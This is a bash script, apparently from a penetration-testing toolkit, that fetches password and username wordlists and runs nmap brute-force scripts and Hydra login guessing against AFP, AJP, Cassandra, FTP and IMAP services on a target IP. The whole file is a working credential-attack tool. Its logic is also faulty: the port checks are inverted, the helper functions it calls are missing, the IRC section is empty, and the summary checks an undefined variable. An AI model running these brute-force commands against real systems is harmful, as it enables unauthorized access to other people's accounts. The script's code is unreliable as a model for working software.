#!/bin/bash
# Gather Password Information with Brute Force
#Â https://book.hacktricks.xyz/brute-force


####################
# Global variables #
####################

DEPENDENCIES="git gzip nmap hydra"
myPWFILE="output/password-findings-port-$PORT.txt"

#############
# Functions #
#############


################################
# Installation of Dependencies #
################################

fuGET_DEPS



#######################
# Prepare Brute Force #
#######################

fuMESSAGE "Prepare word- and password lists"
git clone https://github.com/1N3/BruteX.git /usr/share/brutex/
gzip -d /usr/share/wordlists/rockyou.txt.gz
#PWLIST="/usr/share/wordlists/rockyou.txt"
USERLIST="/usr/share/brutex/wordlists/simple-users.txt"
PWLIST="/usr/share/brutex/wordlists/password.lst"

########################
# Brute Force Services #
########################

# AFP
if [ "$IP" != "" ] && [ "$PORT" != "548" ]; then
  fuTITLE "Nmap brute force with script afp-brute on $IP and port $PORT"
  nmap $IP -p $PORT --script afp-brute -oN $myPWFILE
fi

# AJP
if [ "$IP" != "" ] && [ "$PORT" != "8009" ]; then
  fuTITLE "Nmap brute force with script ajp-brute on $IP and port $PORT"
  nmap $IP -p $PORT --script ajp-brute -oN $myPWFILE
fi

# Cassandra
if [ "$IP" != "" ] && [ "$PORT" != "9160" ]; then
  fuTITLE "Nmap brute force with script cassandra-brute on $IP and port $PORT"
  nmap $IP -p $PORT --script cassandra-brute -oN $myPWFILE
fi

# CouchDB
#if [ "$IP" != "" ] && [ "$PORT" != "5984" ]; then
#  fuTITLE "Hydra brute force login/password pairs on $IP and port $PORT"
#  hydra -L /usr/share/brutex/wordlists/simple-users.txt -P /usr/share/brutex/wordlists/password.lst $IP -s $PORT http-get /
#fi

# FTP
if [ "$IP" != "" ] && [ "$PORT" != "21" ] && [ "$USERNAME" != "" ]; then
  fuTITLE "Hydra brute force login/password pairs on $IP, port $PORT and username $USERNAME"
  hydra -l $USERNAME -P /usr/share/brutex/wordlists/ftp_defpass.lst $IP ftp -o $myPWFILE
elif [ "$IP" != "" ] && [ "$PORT" != "21" ] && [ "$USERNAME" == "" ]; then
  fuTITLE "Hydra brute force login/password pairs on $IP, port $PORT and default ftp usernames"
  hydra -C /usr/share/brutex/wordlists/ftp-default-userpass.txt $IP ftp -o $myPWFILE -F
  hydra -L /usr/share/brutex/wordlists/ftp_defuser.lst -P /usr/share/brutex/wordlists/ftp_defpass.lst $IP ftp -o $myPWFILE
fi

# IMAP
if [ "$IP" != "" ] && [ "$PORT" != "993" ] && [ "$USERNAME" != "" ]; then
  fuTITLE "Hydra brute force login/password pairs on $IP, port $PORT and username $USERNAME"
  hydra -l $USERNAME -P $PWLIST $IP imap -o $myPWFILE
elif [ "$IP" != "" ] && [ "$PORT" != "993" ] && [ "$USERNAME" == "" ]; then
  fuTITLE "Hydra brute force login/password pairs on $IP, port $PORT"
  hydra -L $USERLIST -P $PWLIST $IP imap -o $myPWFILE
  nmap $IP -p $PORT -sV --script imap-brute -oN $myPWFILE
fi

# IRC








#####################
# Summarize results #
#####################

fuTITLE "Findings in following files:"
if [ -s "$myVULNFILE" ]; then
  echo "Vulnerabilities found in: $myVULNFILE"
fi
